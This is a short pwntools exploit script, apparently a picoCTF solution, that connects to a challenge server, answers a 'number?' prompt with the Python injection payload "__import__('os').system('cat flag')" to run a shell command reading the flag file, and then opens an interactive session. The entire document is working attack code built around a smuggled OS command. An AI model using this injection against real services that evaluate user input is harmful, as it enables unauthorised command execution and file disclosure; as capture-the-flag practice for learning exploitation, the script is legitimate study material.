from pwn import *

HOST, PORT = 'wily-courier.picoctf.net', 56828
r = remote(HOST, PORT)

r.recvuntil('number?\n')
r.sendline("__import__('os').system('cat flag')")
r.interactive()